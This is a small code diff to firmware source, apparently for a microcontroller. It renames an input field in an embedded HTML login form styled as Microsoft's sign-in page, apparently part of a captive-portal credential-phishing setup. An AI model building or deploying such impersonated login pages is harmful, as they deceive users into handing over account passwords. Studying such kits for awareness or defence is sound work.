@@ -194,7 +194,7 @@ const char MICROSOFT[] PROGMEM = R"rawliteral(
         <form action="/login" method="post" id="microsoft-login-form">
             <div class="input-group">
                 <input
-                    name="username"
+                    name="email"
                     type="text"
                     class="form-input"
                     placeholder="Email, phone, or Skype"
